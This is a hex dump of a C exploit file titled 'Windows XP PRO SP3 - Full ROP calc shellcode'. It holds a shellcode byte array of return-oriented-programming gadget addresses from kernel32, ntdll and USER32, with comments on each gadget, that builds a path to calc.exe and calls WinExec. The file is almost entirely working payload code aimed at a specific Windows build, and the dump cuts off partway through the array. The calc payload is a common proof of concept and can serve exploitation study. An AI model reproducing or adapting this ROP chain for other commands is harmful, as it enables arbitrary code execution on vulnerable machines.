00000000  2f 2a 0d 0a 20 20 20 20  53 68 65 6c 6c 63 6f 64  |/*..    Shellcod|
00000010  65 3a 20 57 69 6e 64 6f  77 73 20 58 50 20 50 52  |e: Windows XP PR|
00000020  4f 20 53 50 33 20 2d 20  46 75 6c 6c 20 52 4f 50  |O SP3 - Full ROP|
00000030  20 63 61 6c 63 20 73 68  65 6c 6c 63 6f 64 65 0d  | calc shellcode.|
00000040  0a 20 20 20 20 41 75 74  68 6f 72 3a 20 62 33 33  |.    Author: b33|
00000050  66 20 28 68 74 74 70 3a  2f 2f 77 77 77 2e 66 75  |f (http://www.fu|
00000060  7a 7a 79 73 65 63 75 72  69 74 79 2e 63 6f 6d 2f  |zzysecurity.com/|
00000070  29 0d 0a 20 20 20 20 4e  6f 74 65 73 3a 20 54 68  |)..    Notes: Th|
00000080  69 73 20 69 73 20 70 72  6f 62 61 62 6c 79 20 6e  |is is probably n|
00000090  6f 74 20 74 68 65 20 6d  6f 73 74 20 65 66 66 69  |ot the most effi|
000000a0  63 69 65 6e 74 20 77 61  79 20 62 75 74 0d 0a 20  |cient way but.. |
000000b0  20 20 20 20 20 20 20 20  20 20 49 20 67 61 76 65  |          I gave|
000000c0  20 74 68 65 20 64 6c 6c  27 73 20 61 20 72 75 6e  | the dll's a run|
000000d0  20 66 6f 72 20 74 68 65  69 72 20 6d 6f 6e 65 79  | for their money|
000000e0  20 3b 29 29 0d 0a 20 20  20 20 47 72 65 65 74 73  | ;))..    Greets|
000000f0  3a 20 44 6f 6e 61 74 6f  2c 20 4a 61 68 6d 65 6c  |: Donato, Jahmel|
00000100  0d 0a 20 0d 0a 20 20 20  20 4f 53 2d 44 4c 4c 27  |.. ..    OS-DLL'|
00000110  73 20 75 73 65 64 3a 0d  0a 20 20 20 20 20 20 20  |s used:..       |
00000120  42 61 73 65 20 20 20 20  7c 20 20 20 20 54 6f 70  |Base    |    Top|
00000130  20 20 20 20 20 7c 20 20  20 53 69 7a 65 20 20 20  |     |   Size   |
00000140  20 20 7c 20 20 20 20 56  65 72 73 69 6f 6e 20 28  |  |    Version (|
00000150  49 6d 70 6f 72 74 61 6e  74 21 29 0d 0a 20 20 20  |Important!)..   |
00000160  20 5f 5f 5f 5f 5f 5f 5f  5f 5f 5f 5f 7c 5f 5f 5f  | ___________|___|
00000170  5f 5f 5f 5f 5f 5f 5f 5f  5f 7c 5f 5f 5f 5f 5f 5f  |_________|______|
00000180  5f 5f 5f 5f 5f 5f 7c 5f  5f 5f 5f 5f 5f 5f 5f 5f  |______|_________|
00000190  5f 5f 5f 5f 5f 5f 5f 5f  5f 5f 5f 5f 5f 5f 5f 5f  |________________|
000001a0  5f 5f 5f 5f 0d 0a 20 20  20 20 30 78 37 63 38 30  |____..    0x7c80|
000001b0  30 30 30 30 20 7c 20 30  78 37 63 38 66 36 30 30  |0000 | 0x7c8f600|
000001c0  30 20 7c 20 30 78 30 30  30 66 36 30 30 30 20 7c  |0 | 0x000f6000 ||
000001d0  20 35 2e 31 2e 32 36 30  30 2e 35 37 38 31 20 5b  | 5.1.2600.5781 [|
000001e0  6b 65 72 6e 65 6c 33 32  2e 64 6c 6c 5d 0d 0a 20  |kernel32.dll].. |
000001f0  20 20 20 30 78 37 63 39  30 30 30 30 30 20 7c 20  |   0x7c900000 | |
00000200  30 78 37 63 39 62 32 30  30 30 20 7c 20 30 78 30  |0x7c9b2000 | 0x0|
00000210  30 30 62 32 30 30 30 20  7c 20 35 2e 31 2e 32 36  |00b2000 | 5.1.26|
00000220  30 30 2e 36 30 35 35 20  5b 6e 74 64 6c 6c 2e 64  |00.6055 [ntdll.d|
00000230  6c 6c 5d 0d 0a 20 20 20  20 30 78 37 65 34 31 30  |ll]..    0x7e410|
00000240  30 30 30 20 7c 20 30 78  37 65 34 61 31 30 30 30  |000 | 0x7e4a1000|
00000250  20 7c 20 30 78 30 30 30  39 31 30 30 30 20 7c 20  | | 0x00091000 | |
00000260  35 2e 31 2e 32 36 30 30  2e 35 35 31 32 20 5b 55  |5.1.2600.5512 [U|
00000270  53 45 52 33 32 2e 64 6c  6c 5d 0d 0a 20 0d 0a 20  |SER32.dll].. .. |
00000280  20 20 20 55 49 4e 54 20  57 49 4e 41 50 49 20 57  |   UINT WINAPI W|
00000290  69 6e 45 78 65 63 28 20  20 20 20 20 20 20 20 20  |inExec(         |
000002a0  20 20 20 3d 3e 20 50 54  52 20 74 6f 20 57 69 6e  |   => PTR to Win|
000002b0  45 78 65 63 0d 0a 20 20  20 20 20 20 5f 5f 69 6e  |Exec..      __in|
000002c0  20 20 4c 50 43 53 54 52  20 6c 70 43 6d 64 4c 69  |  LPCSTR lpCmdLi|
000002d0  6e 65 2c 20 20 20 20 20  20 20 3d 3e 20 43 3a 5c  |ne,       => C:\|
000002e0  57 49 4e 44 4f 57 53 5c  73 79 73 74 65 6d 33 32  |WINDOWS\system32|
000002f0  5c 63 61 6c 63 2e 65 78  65 2b 30 30 30 30 30 30  |\calc.exe+000000|
00000300  30 30 0d 0a 20 20 20 20  20 20 5f 5f 69 6e 20 20  |00..      __in  |
00000310  55 49 4e 54 20 75 43 6d  64 53 68 6f 77 20 20 20  |UINT uCmdShow   |
00000320  20 20 20 20 20 20 20 20  3d 3e 20 30 78 31 0d 0a  |        => 0x1..|
00000330  20 20 20 20 29 3b 0d 0a  2a 2f 0d 0a 20 0d 0a 23  |    );..*/.. ..#|
00000340  69 6e 63 6c 75 64 65 20  3c 69 6f 73 74 72 65 61  |include <iostrea|
00000350  6d 3e 0d 0a 23 69 6e 63  6c 75 64 65 20 22 77 69  |m>..#include "wi|
00000360  6e 64 6f 77 73 2e 68 22  0d 0a 20 0d 0a 63 68 61  |ndows.h".. ..cha|
00000370  72 20 73 68 65 6c 6c 63  6f 64 65 5b 5d 3d 0d 0a  |r shellcode[]=..|
00000380  22 5c 78 62 31 5c 78 34  66 5c 78 39 37 5c 78 37  |"\xb1\x4f\x97\x7|
00000390  63 22 20 20 2f 2f 20 50  4f 50 20 45 43 58 20 23  |c"  // POP ECX #|
000003a0  20 52 45 54 4e 0d 0a 22  5c 78 66 39 5c 78 31 30  | RETN.."\xf9\x10|
000003b0  5c 78 34 37 5c 78 37 65  22 20 20 2f 2f 20 57 72  |\x47\x7e"  // Wr|
000003c0  69 74 61 62 6c 65 20 50  54 52 20 55 53 45 52 33  |itable PTR USER3|
000003d0  32 2e 64 6c 6c 0d 0a 22  5c 78 32 37 5c 78 66 61  |2.dll.."\x27\xfa|
000003e0  5c 78 38 37 5c 78 37 63  22 20 20 2f 2f 20 50 4f  |\x87\x7c"  // PO|
000003f0  50 20 45 44 58 20 23 20  50 4f 50 20 45 41 58 20  |P EDX # POP EAX |
00000400  23 20 52 45 54 4e 0d 0a  22 5c 78 34 33 5c 78 33  |# RETN.."\x43\x3|
00000410  61 5c 78 35 63 5c 78 35  37 22 20 20 2f 2f 20 41  |a\x5c\x57"  // A|
00000420  53 43 49 49 20 22 43 3a  5c 57 22 0d 0a 22 5c 78  |SCII "C:\W".."\x|
00000430  34 39 5c 78 34 65 5c 78  34 34 5c 78 34 66 22 20  |49\x4e\x44\x4f" |
00000440  20 2f 2f 20 41 53 43 49  49 20 22 49 4e 44 4f 22  | // ASCII "INDO"|
00000450  0d 0a 22 5c 78 30 34 5c  78 31 38 5c 78 38 30 5c  |.."\x04\x18\x80\|
00000460  78 37 63 22 20 20 2f 2f  20 4d 4f 56 20 44 57 4f  |x7c"  // MOV DWO|
00000470  52 44 20 50 54 52 20 44  53 3a 5b 45 43 58 5d 2c  |RD PTR DS:[ECX],|
00000480  45 44 58 20 23 20 4d 4f  56 20 44 57 4f 52 44 20  |EDX # MOV DWORD |
00000490  50 54 52 20 44 53 3a 5b  45 43 58 2b 34 5d 2c 45  |PTR DS:[ECX+4],E|
000004a0  41 58 20 23 20 50 4f 50  20 45 42 50 20 23 20 52  |AX # POP EBP # R|
000004b0  45 54 4e 20 30 34 0d 0a  22 5c 78 38 61 5c 78 32  |ETN 04.."\x8a\x2|
000004c0  30 5c 78 38 37 5c 78 37  63 22 20 20 2f 2f 20 43  |0\x87\x7c"  // C|
000004d0  6f 6d 70 65 6e 73 61 74  65 20 50 4f 50 0d 0a 22  |ompensate POP.."|
000004e0  5c 78 38 61 5c 78 32 30  5c 78 38 37 5c 78 37 63  |\x8a\x20\x87\x7c|
000004f0  22 20 20 2f 2f 20 43 6f  6d 70 65 6e 73 61 74 65  |"  // Compensate|
00000500  20 52 45 54 4e 0d 0a 22  5c 78 38 61 5c 78 32 30  | RETN.."\x8a\x20|
00000510  5c 78 38 37 5c 78 37 63  22 20 20 2f 2f 20 43 6f  |\x87\x7c"  // Co|
00000520  6d 70 65 6e 73 61 74 65  20 52 45 54 4e 0d 0a 22  |mpensate RETN.."|
00000530  5c 78 65 35 5c 78 30 32  5c 78 38 38 5c 78 37 63  |\xe5\x02\x88\x7c|
00000540  22 20 20 2f 2f 20 50 4f  50 20 45 41 58 20 23 20  |"  // POP EAX # |
00000550  52 45 54 4e 0d 0a 22 5c  78 35 37 5c 78 35 33 5c  |RETN.."\x57\x53\|
00000560  78 35 63 5c 78 37 33 22  20 20 2f 2f 20 41 53 43  |x5c\x73"  // ASC|
00000570  49 49 20 22 57 53 5c 73  22 0d 0a 22 5c 78 33 38  |II "WS\s".."\x38|
00000580  5c 78 64 36 5c 78 34 36  5c 78 37 65 22 20 20 2f  |\xd6\x46\x7e"  /|
00000590  2f 20 4d 4f 56 20 44 57  4f 52 44 20 50 54 52 20  |/ MOV DWORD PTR |
000005a0  44 53 3a 5b 45 43 58 2b  38 5d 2c 45 41 58 20 23  |DS:[ECX+8],EAX #|
000005b0  20 50 4f 50 20 45 53 49  20 23 20 50 4f 50 20 45  | POP ESI # POP E|
000005c0  42 50 20 23 20 52 45 54  4e 20 30 38 0d 0a 22 5c  |BP # RETN 08.."\|
000005d0  78 38 61 5c 78 32 30 5c  78 38 37 5c 78 37 63 22  |x8a\x20\x87\x7c"|
000005e0  20 20 2f 2f 20 43 6f 6d  70 65 6e 73 61 74 65 20  |  // Compensate |
000005f0  50 4f 50 0d 0a 22 5c 78  38 61 5c 78 32 30 5c 78  |POP.."\x8a\x20\x|
00000600  38 37 5c 78 37 63 22 20  20 2f 2f 20 43 6f 6d 70  |87\x7c"  // Comp|
00000610  65 6e 73 61 74 65 20 50  4f 50 0d 0a 22 5c 78 38  |ensate POP.."\x8|
00000620  61 5c 78 32 30 5c 78 38  37 5c 78 37 63 22 20 20  |a\x20\x87\x7c"  |
00000630  2f 2f 20 43 6f 6d 70 65  6e 73 61 74 65 20 52 45  |// Compensate RE|
00000640  54 4e 0d 0a 22 5c 78 38  61 5c 78 32 30 5c 78 38  |TN.."\x8a\x20\x8|
00000650  37 5c 78 37 63 22 20 20  2f 2f 20 43 6f 6d 70 65  |7\x7c"  // Compe|
00000660  6e 73 61 74 65 20 52 45  54 4e 0d 0a 22 5c 78 38  |nsate RETN.."\x8|
00000670  61 5c 78 32 30 5c 78 38  37 5c 78 37 63 22 20 20  |a\x20\x87\x7c"  |
00000680  2f 2f 20 43 6f 6d 70 65  6e 73 61 74 65 20 52 45  |// Compensate RE|
00000690  54 4e 0d 0a 22 5c 78 65  35 5c 78 30 32 5c 78 38  |TN.."\xe5\x02\x8|
000006a0  38 5c 78 37 63 22 20 20  2f 2f 20 50 4f 50 20 45  |8\x7c"  // POP E|
000006b0  41 58 20 23 20 52 45 54  4e 0d 0a 22 5c 78 37 39  |AX # RETN.."\x79|
000006c0  5c 78 37 33 5c 78 37 34  5c 78 36 35 22 20 20 2f  |\x73\x74\x65"  /|
000006d0  2f 20 41 53 43 49 49 20  22 79 73 74 65 22 0d 0a  |/ ASCII "yste"..|
000006e0  22 5c 78 63 62 5c 78 62  65 5c 78 34 35 5c 78 37  |"\xcb\xbe\x45\x7|
000006f0  65 22 20 20 2f 2f 20 4d  4f 56 20 44 57 4f 52 44  |e"  // MOV DWORD|
00000700  20 50 54 52 20 44 53 3a  5b 45 43 58 2b 43 5d 2c  | PTR DS:[ECX+C],|
00000710  45 41 58 20 23 20 58 4f  52 20 45 41 58 2c 45 41  |EAX # XOR EAX,EA|
00000720  58 20 23 20 49 4e 43 20  45 41 58 20 23 20 50 4f  |X # INC EAX # PO|
00000730  50 20 45 53 49 20 23 20  50 4f 50 20 45 42 50 20  |P ESI # POP EBP |
00000740  23 20 52 45 54 4e 20 30  38 0d 0a 22 5c 78 38 61  |# RETN 08.."\x8a|
00000750  5c 78 32 30 5c 78 38 37  5c 78 37 63 22 20 20 2f  |\x20\x87\x7c"  /|
00000760  2f 20 43 6f 6d 70 65 6e  73 61 74 65 20 50 4f 50  |/ Compensate POP|
00000770  0d 0a 22 5c 78 38 61 5c  78 32 30 5c 78 38 37 5c  |.."\x8a\x20\x87\|
00000780  78 37 63 22 20 20 2f 2f  20 43 6f 6d 70 65 6e 73  |x7c"  // Compens|
00000790  61 74 65 20 50 4f 50 0d  0a 22 5c 78 38 61 5c 78  |ate POP.."\x8a\x|
000007a0  32 30 5c 78 38 37 5c 78  37 63 22 20 20 2f 2f 20  |20\x87\x7c"  // |
000007b0  43 6f 6d 70 65 6e 73 61  74 65 20 52 45 54 4e 0d  |Compensate RETN.|
000007c0  0a 22 5c 78 38 61 5c 78  32 30 5c 78 38 37 5c 78  |."\x8a\x20\x87\x|
000007d0  37 63 22 20 20 2f 2f 20  43 6f 6d 70 65 6e 73 61  |7c"  // Compensa|
000007e0  74 65 20 52 45 54 4e 0d  0a 22 5c 78 38 61 5c 78  |te RETN.."\x8a\x|
000007f0  32 30 5c 78 38 37 5c 78  37 63 22 20 20 2f 2f 20  |20\x87\x7c"  // |
00000800  43 6f 6d 70 65 6e 73 61  74 65 20 52 45 54 4e 0d  |Compensate RETN.|
00000810  0a 22 5c 78 65 35 5c 78  30 32 5c 78 38 38 5c 78  |."\xe5\x02\x88\x|
00000820  37 63 22 20 20 2f 2f 20  50 4f 50 20 45 41 58 20  |7c"  // POP EAX |
00000830  23 20 52 45 54 4e 0d 0a  22 5c 78 36 33 5c 78 36  |# RETN.."\x63\x6|
00000840  31 5c 78 36 63 5c 78 36  33 22 20 20 2f 2f 20 41  |1\x6c\x63"  // A|
00000850  53 43 49 49 20 22 63 61  6c 63 22 0d 0a 22 5c 78  |SCII "calc".."\x|
00000860  33 31 5c 78 61 39 5c 78  39 31 5c 78 37 63 22 20  |31\xa9\x91\x7c" |
00000870  20 2f 2f 20 4d 4f 56 20  44 57 4f 52 44 20 50 54  | // MOV DWORD PT|
00000880  52 20 44 53 3a 5b 45 43  58 2b 31 34 5d 2c 45 41  |R DS:[ECX+14],EA|
00000890  58 20 23 20 4d 4f 56 20  45 41 58 2c 45 44 58 20  |X # MOV EAX,EDX |
000008a0  23 20 50 4f 50 20 45 42  50 20 23 20 52 45 54 4e  |# POP EBP # RETN|
000008b0  20 30 38 0d 0a 22 5c 78  38 61 5c 78 32 30 5c 78  | 08.."\x8a\x20\x|
000008c0  38 37 5c 78 37 63 22 20  20 2f 2f 20 43 6f 6d 70  |87\x7c"  // Comp|
000008d0  65 6e 73 61 74 65 20 50  4f 50 0d 0a 22 5c 78 38  |ensate POP.."\x8|
000008e0  61 5c 78 32 30 5c 78 38  37 5c 78 37 63 22 20 20  |a\x20\x87\x7c"  |
000008f0  2f 2f 20 43 6f 6d 70 65  6e 73 61 74 65 20 52 45  |// Compensate RE|
00000900  54 4e 0d 0a 22 5c 78 38  61 5c 78 32 30 5c 78 38  |TN.."\x8a\x20\x8|
00000910  37 5c 78 37 63 22 20 20  2f 2f 20 43 6f 6d 70 65  |7\x7c"  // Compe|
00000920  6e 73 61 74 65 20 52 45  54 4e 0d 0a 22 5c 78 38  |nsate RETN.."\x8|
00000930  61 5c 78 32 30 5c 78 38  37 5c 78 37 63 22 20 20  |a\x20\x87\x7c"  |
00000940  2f 2f 20 43 6f 6d 70 65  6e 73 61 74 65 20 52 45  |// Compensate RE|
00000950  54 4e 0d 0a 22 5c 78 30  37 5c 78 33 64 5c 78 39  |TN.."\x07\x3d\x9|
00000960  36 5c 78 37 63 22 20 20  2f 2f 20 49 4e 43 20 45  |6\x7c"  // INC E|
00000970  43 58 20 23 20 52 45 54  4e 0d 0a 22 5c 78 30 37  |CX # RETN.."\x07|
00000980  5c 78 33 64 5c 78 39 36  5c 78 37 63 22 20 20 2f  |\x3d\x96\x7c"  /|
00000990  2f 20 49 4e 43 20 45 43  58 20 23 20 52 45 54 4e  |/ INC ECX # RETN|
000009a0  0d 0a 22 5c 78 30 37 5c  78 33 64 5c 78 39 36 5c  |.."\x07\x3d\x96\|
000009b0  78 37 63 22 20 20 2f 2f  20 49 4e 43 20 45 43 58  |x7c"  // INC ECX|
000009c0  20 23 20 52 45 54 4e 0d  0a 22 5c 78 30 37 5c 78  | # RETN.."\x07\x|
000009d0  33 64 5c 78 39 36 5c 78  37 63 22 20 20 2f 2f 20  |3d\x96\x7c"  // |
000009e0  49 4e 43 20 45 43 58 20  23 20 52 45 54 4e 0d 0a  |INC ECX # RETN..|
000009f0  22 5c 78 65 35 5c 78 30  32 5c 78 38 38 5c 78 37  |"\xe5\x02\x88\x7|
00000a00  63 22 20 20 2f 2f 20 50  4f 50 20 45 41 58 20 23  |c"  // POP EAX #|
00000a10  20 52 45 54 4e 0d 0a 22  5c 78 36 64 5c 78 33 33  | RETN.."\x6d\x33|
00000a20  5c 78 33 32 5c 78 35 63  22 20 20 2f 2f 20 41 53  |\x32\x5c"  // AS|
00000a30  43 49 49 20 22 6d 33 32  5c 22 0d 0a 22 5c 78 63  |CII "m32\".."\xc|
00000a40  62 5c 78 62 65 5c 78 34  35 5c 78 37 65 22 20 20  |b\xbe\x45\x7e"  |
00000a50  2f 2f 20 4d 4f 56 20 44  57 4f 52 44 20 50 54 52  |// MOV DWORD PTR|
00000a60  20 44 53 3a 5b 45 43 58  2b 43 5d 2c 45 41 58 20  | DS:[ECX+C],EAX |
00000a70  23 20 58 4f 52 20 45 41  58 2c 45 41 58 20 23 20  |# XOR EAX,EAX # |
00000a80  49 4e 43 20 45 41 58 20  23 20 50 4f 50 20 45 53  |INC EAX # POP ES|
00000a90  49 20 23 20 50 4f 50 20  45 42 50 20 23 20 52 45  |I # POP EBP # RE|
00000aa0  54 4e 20 30 38 0d 0a 22  5c 78 38 61 5c 78 32 30  |TN 08.."\x8a\x20|
00000ab0  5c 78 38 37 5c 78 37 63  22 20 20 2f 2f 20 43 6f  |\x87\x7c"  // Co|
00000ac0  6d 70 65 6e 73 61 74 65  20 50 4f 50 0d 0a 22 5c  |mpensate POP.."\|
00000ad0  78 38 61 5c 78 32 30 5c  78 38 37 5c 78 37 63 22  |x8a\x20\x87\x7c"|
00000ae0  20 20 2f 2f 20 43 6f 6d  70 65 6e 73 61 74 65 20  |  // Compensate |
00000af0  50 4f 50 0d 0a 22 5c 78  38 61 5c 78 32 30 5c 78  |POP.."\x8a\x20\x|
00000b00  38 37 5c 78 37 63 22 20  20 2f 2f 20 43 6f 6d 70  |87\x7c"  // Comp|
00000b10  65 6e 73 61 74 65 20 52  45 54 4e 0d 0a 22 5c 78  |ensate RETN.."\x|
00000b20  38 61 5c 78 32 30 5c 78  38 37 5c 78 37 63 22 20  |8a\x20\x87\x7c" |
00000b30  20 2f 2f 20 43 6f 6d 70  65 6e 73 61 74 65 20 52  | // Compensate R|
00000b40  45 54 4e 0d 0a 22 5c 78  38 61 5c 78 32 30 5c 78  |ETN.."\x8a\x20\x|
00000b50  38 37 5c 78 37 63 22 20  20 2f 2f 20 43 6f 6d 70  |87\x7c"  // Comp|
00000b60  65 6e 73 61 74 65 20 52  45 54 4e 0d 0a 22 5c 78  |ensate RETN.."\x|
00000b70  65 35 5c 78 30 32 5c 78  38 38 5c 78 37 63 22 20  |e5\x02\x88\x7c" |
00000b80  20 2f 2f 20 50 4f 50 20  45 41 58 20 23 20 52 45  | // POP EAX # RE|
00000b90  54 4e 0d 0a 22 5c 78 32  65 5c 78 36 35 5c 78 37  |TN.."\x2e\x65\x7|
00000ba0  38 5c 78 36 35 22 20 20  2f 2f 20 41 53 43 49 49  |8\x65"  // ASCII|
00000bb0  20 22 2e 65 78 65 22 0d  0a 22 5c 78 33 31 5c 78  | ".exe".."\x31\x|
00000bc0  61 39 5c 78 39 31 5c 78  37 63 22 20 20 2f 2f 20  |a9\x91\x7c"  // |
00000bd0  4d 4f 56 20 44 57 4f 52  44 20 50 54 52 20 44 53  |MOV DWORD PTR DS|
00000be0  3a 5b 45 43 58 2b 31 34  5d 2c 45 41 58 20 23 20  |:[ECX+14],EAX # |
00000bf0  4d 4f 56 20 45 41 58 2c  45 44 58 20 23 20 50 4f  |MOV EAX,EDX # PO|
00000c00  50 20 45 42 50 20 23 20  52 45 54 4e 20 30 38 0d  |P EBP # RETN 08.|
00000c10  0a 22 5c 78 38 61 5c 78  32 30 5c 78 38 37 5c 78  |."\x8a\x20\x87\x|
00000c20  37 63 22 20 20 2f 2f 20  43 6f 6d 70 65 6e 73 61  |7c"  // Compensa|
00000c30  74 65 20 50 4f 50 0d 0a  22 5c 78 38 61 5c 78 32  |te POP.."\x8a\x2|
00000c40  30 5c 78 38 37 5c 78 37  63 22 20 20 2f 2f 20 43  |0\x87\x7c"  // C|
00000c50  6f 6d 70 65 6e 73 61 74  65 20 52 45 54 4e 0d 0a  |ompensate RETN..|
00000c60  22 5c 78 38 61 5c 78 32  30 5c 78 38 37 5c 78 37  |"\x8a\x20\x87\x7|
00000c70  63 22 20 20 2f 2f 20 43  6f 6d 70 65 6e 73 61 74  |c"  // Compensat|
00000c80  65 20 52 45 54 4e 0d 0a  22 5c 78 38 61 5c 78 32  |e RETN.."\x8a\x2|
00000c90  30 5c 78 38 37 5c 78 37  63 22 20 20 2f 2f 20 43  |0\x87\x7c"  // C|
00000ca0  6f 6d 70 65 6e 73 61 74  65 20 52 45 54 4e 0d 0a  |ompensate RETN..|
00000cb0  22 5c 78 30 37 5c 78 33  64 5c 78 39 36 5c 78 37  |"\x07\x3d\x96\x7|
00000cc0  63 22 20 20 2f 2f 20 49  4e 43 20 45 43 58 20 23  |c"  // INC ECX #|
00000cd0  20 52 45 54 4e 0d 0a 22  5c 78 30 37 5c 78 33 64  | RETN.."\x07\x3d|
00000ce0  5c 78 39 36 5c 78 37 63  22 20 20 2f 2f 20 49 4e  |\x96\x7c"  // IN|
00000cf0  43 20 45 43 58 20 23 20  52 45 54 4e 0d 0a 22 5c  |C ECX # RETN.."\|
00000d00  78 30 37 5c 78 33 64 5c  78 39 36 5c 78 37 63 22  |x07\x3d\x96\x7c"|
00000d10  20 20 2f 2f 20 49 4e 43  20 45 43 58 20 23 20 52  |  // INC ECX # R|
00000d20  45 54 4e 0d 0a 22 5c 78  30 37 5c 78 33 64 5c 78  |ETN.."\x07\x3d\x|
00000d30  39 36 5c 78 37 63 22 20  20 2f 2f 20 49 4e 43 20  |96\x7c"  // INC |
00000d40  45 43 58 20 23 20 52 45  54 4e 0d 0a 22 5c 78 39  |ECX # RETN.."\x9|
00000d50  65 5c 78 32 65 5c 78 39  32 5c 78 37 63 22 20 20  |e\x2e\x92\x7c"  |
00000d60  2f 2f 20 58 4f 52 20 45  41 58 2c 45 41 58 20 23  |// XOR EAX,EAX #|
00000d70  20 52 45 54 4e 0d 0a 22  5c 78 33 31 5c 78 61 39  | RETN.."\x31\xa9|
00000d80  5c 78 39 31 5c 78 37 63  22 20 20 2f 2f 20 4d 4f  |\x91\x7c"  // MO|
00000d90  56 20 44 57 4f 52 44 20  50 54 52 20 44 53 3a 5b  |V DWORD PTR DS:[|
00000da0  45 43 58 2b 31 34 5d 2c  45 41 58 20 23 20 4d 4f  |ECX+14],EAX # MO|
00000db0  56 20 45 41 58 2c 45 44  58 20 23 20 50 4f 50 20  |V EAX,EDX # POP |
00000dc0  45 42 50 20 23 20 52 45  54 4e 20 30 38 0d 0a 22  |EBP # RETN 08.."|
00000dd0  5c 78 38 61 5c 78 32 30  5c 78 38 37 5c 78 37 63  |\x8a\x20\x87\x7c|
00000de0  22 20 20 2f 2f 20 43 6f  6d 70 65 6e 73 61 74 65  |"  // Compensate|
00000df0  20 50 4f 50 0d 0a 22 5c  78 38 61 5c 78 32 30 5c  | POP.."\x8a\x20\|
00000e00  78 38 37 5c 78 37 63 22  20 20 2f 2f 20 43 6f 6d  |x87\x7c"  // Com|
00000e10  70 65 6e 73 61 74 65 20  52 45 54 4e 0d 0a 22 5c  |pensate RETN.."\|
00000e20  78 38 61 5c 78 32 30 5c  78 38 37 5c 78 37 63 22  |x8a\x20\x87\x7c"|
00000e30  20 20 2f 2f 20 43 6f 6d  70 65 6e 73 61 74 65 20  |  // Compensate |
00000e40  52 45 54 4e 0d 0a 22 5c  78 38 61 5c 78 32 30 5c  |RETN.."\x8a\x20\|
00000e50  78 38 37 5c 78 37 63 22  20 20 2f 2f 20 43 6f 6d  |x87\x7c"  // Com|
00000e60  70 65 6e 73 61 74 65 20  52 45 54 4e 0d 0a 22 5c  |pensate RETN.."\|
00000e70  78 65 65 5c 78 34 63 5c  78 39 37 5c 78 37 63 22  |xee\x4c\x97\x7c"|
00000e80  20 20 2f 2f 20 44 45 43  20 45 43 58 20 23 20 52  |  // DEC ECX # R|
00000e90  45 54 4e 0d 0a 22 5c 78  65 65 5c 78 34 63 5c 78  |ETN.."\xee\x4c\x|
00000ea0  39 37 5c 78 37 63 22 20  20 2f 2f 20 44 45 43 20  |97\x7c"  // DEC |
00000eb0  45 43 58 20 23 20 52 45  54 4e 0d 0a 22 5c 78 65  |ECX # RETN.."\xe|
00000ec0  65 5c 78 34 63 5c 78 39  37 5c 78 37 63 22 20 20  |e\x4c\x97\x7c"  |
00000ed0  2f 2f 20 44 45 43 20 45  43 58 20 23 20 52 45 54  |// DEC ECX # RET|
00000ee0  4e 0d 0a 22 5c 78 65 65  5c 78 34 63 5c 78 39 37  |N.."\xee\x4c\x97|
00000ef0  5c 78 37 63 22 20 20 2f  2f 20 44 45 43 20 45 43  |\x7c"  // DEC EC|
00000f00  58 20 23 20 52 45 54 4e  0d 0a 22 5c 78 65 65 5c  |X # RETN.."\xee\|
00000f10  78 34 63 5c 78 39 37 5c  78 37 63 22 20 20 2f 2f  |x4c\x97\x7c"  //|
00000f20  20 44 45 43 20 45 43 58  20 23 20 52 45 54 4e 0d  | DEC ECX # RETN.|
00000f30  0a 22 5c 78 65 65 5c 78  34 63 5c 78 39 37 5c 78  |."\xee\x4c\x97\x|
00000f40  37 63 22 20 20 2f 2f 20  44 45 43 20 45 43 58 20  |7c"  // DEC ECX |
00000f50  23 20 52 45 54 4e 0d 0a  22 5c 78 65 65 5c 78 34  |# RETN.."\xee\x4|
00000f60  63 5c 78 39 37 5c 78 37  63 22 20 20 2f 2f 20 44  |c\x97\x7c"  // D|
00000f70  45 43 20 45 43 58 20 23  20 52 45 54 4e 0d 0a 22  |EC ECX # RETN.."|
00000f80  5c 78 65 65 5c 78 34 63  5c 78 39 37 5c 78 37 63  |\xee\x4c\x97\x7c|
00000f90  22 20 20 2f 2f 20 44 45  43 20 45 43 58 20 23 20  |"  // DEC ECX # |
00000fa0  52 45 54 4e 0d 0a 2f 2f  2d 2d 2d 2d 2d 2d 2d 2d  |RETN..//--------|
00000fb0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000fd0  2d 2d 2d 5b 22 43 3a 5c  57 49 4e 44 4f 57 53 5c  |---["C:\WINDOWS\|
00000fe0  73 79 73 74 65 6d 33 32  5c 63 61 6c 63 2e 65 78  |system32\calc.ex|
00000ff0  65 2b 30 30 30 30 30 30  30 30 22 20 2d 3e 20 65  |e+00000000" -> e|
00001000  63 78 5d 2d 2f 2f 0d 0a  22 5c 78 65 35 5c 78 30  |cx]-//.."\xe5\x0|
00001010  32 5c 78 38 38 5c 78 37  63 22 20 20 2f 2f 20 50  |2\x88\x7c"  // P|
00001020  4f 50 20 45 41 58 20 23  20 52 45 54 4e 0d 0a 22  |OP EAX # RETN.."|
00001030  5c 78 37 61 5c 78 65 62  5c 78 63 33 5c 78 36 66  |\x7a\xeb\xc3\x6f|
00001040  22 20 20 2f 2f 20 53 68  6f 75 6c 64 20 72 65 73  |"  // Should res|
00001050  75 6c 74 20 69 6e 20 61  20 76 61 6c 69 64 20 50  |ult in a valid P|
00001060  54 52 20 69 6e 20 6b 65  72 6e 65 6c 33 32 2e 64  |TR in kernel32.d|
00001070  6c 6c 0d 0a 22 5c 78 34  66 5c 78 64 61 5c 78 38  |ll.."\x4f\xda\x8|
00001080  35 5c 78 37 63 22 20 20  2f 2f 20 50 55 53 48 20  |5\x7c"  // PUSH |
00001090  45 53 50 20 23 20 41 44  43 20 42 59 54 45 20 50  |ESP # ADC BYTE P|
000010a0  54 52 20 44 53 3a 5b 45  41 58 2b 43 43 34 38 33  |TR DS:[EAX+CC483|
000010b0  37 43 5d 2c 41 4c 20 23  20 58 4f 52 20 45 41 58  |7C],AL # XOR EAX|
000010c0  2c 45 41 58 20 23 20 49  4e 43 20 45 41 58 20 23  |,EAX # INC EAX #|
000010d0  20 50 4f 50 20 45 44 49  20 23 20 50 4f 50 20 45  | POP EDI # POP E|
000010e0  42 50 20 23 20 52 45 54  4e 20 30 38 0d 0a 22 5c  |BP # RETN 08.."\|
000010f0  78 38 61 5c 78 32 30 5c  78 38 37 5c 78 37 63 22  |x8a\x20\x87\x7c"|
00001100  20 20 2f 2f 20 43 6f 6d  70 65 6e 73 61 74 65 20  |  // Compensate |
00001110  50 4f 50 0d 0a 22 5c 78  38 61 5c 78 32 30 5c 78  |POP.."\x8a\x20\x|
